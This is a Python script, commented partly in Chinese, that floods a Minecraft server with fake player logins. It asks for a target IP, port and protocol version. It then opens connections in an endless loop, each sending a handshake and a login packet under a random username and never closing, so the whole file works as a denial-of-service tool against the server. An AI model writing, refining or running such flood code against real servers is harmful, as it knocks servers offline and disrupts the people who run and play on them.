# 导入socket, threading, random和string模块
import socket
import threading
import random
import string


def generate_random_username():
    min_length = 1
    max_length = 16
    length = random.randint(min_length, max_length)
    charset = string.ascii_letters + string.digits
    username = "".join(random.choices(charset, k=length))
    return username


class MCClient:
    def __init__(self, host, port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((host, port))
        self.socket.setblocking(False)
        self.recv_thread = threading.Thread(target=self.recv_data)
        self.recv_thread.start()
        self.send_handshake_and_login()

    def recv_data(self):
        while True:
            try:
                data = self.socket.recv(1024)
                if not data:
                    break
                # print(f"Received: {data}")
            except:
                pass

    def send_data(self, data):
        try:
            self.socket.send(data)
            # print(f"Sent: {data}")
        except:
            pass

    def send_handshake_and_login(self):
        def encode_varint(value):
            result = b""
            while True:
                byte = value & 0x7F
                value >>= 7
                if value != 0:
                    byte |= 0x80
                result += bytes([byte])
                if value == 0:
                    break
            return result

        def encode_string(value):
            data = value.encode("utf-8")
            length = len(data)
            length = encode_varint(length)
            return length + data

        def encode_handshake_packet():
            packet_id = 0
            protocol_version = version
            server_address = serverip
            server_port = serverport
            next_state = 2
            packet_id = encode_varint(packet_id)
            protocol_version = encode_varint(protocol_version)
            server_address = encode_string(server_address)
            server_port = server_port.to_bytes(2, "big")
            next_state = encode_varint(next_state)
            packet_data = (
                packet_id + protocol_version + server_address + server_port + next_state
            )

            packet_length = len(packet_data)
            packet_length = encode_varint(packet_length)
            return packet_length + packet_data

        def encode_login_packet():
            packet_id = 0
            username = generate_random_username()
            packet_id = encode_varint(packet_id)
            username = encode_string(username)
            packet_data = packet_id + username
            packet_length = len(packet_data)
            packet_length = encode_varint(packet_length)
            return packet_length + packet_data

        handshake_packet = encode_handshake_packet()
        login_packet = encode_login_packet()

        self.send_data(handshake_packet)
        self.send_data(login_packet)


def create_multiple_clients(host, port):
    clients = []

    while True:
        client = MCClient(host, port)

        clients.append(client)


serverip = input("serverip(127.0.0.1):")
serverport = int(input("serverport 端口号(25565):"))
version = int(input("Protocol 协议版本(https://wiki.vg/Protocol_version_numbers)1.8=47:"))
clients = create_multiple_clients(serverip, serverport)
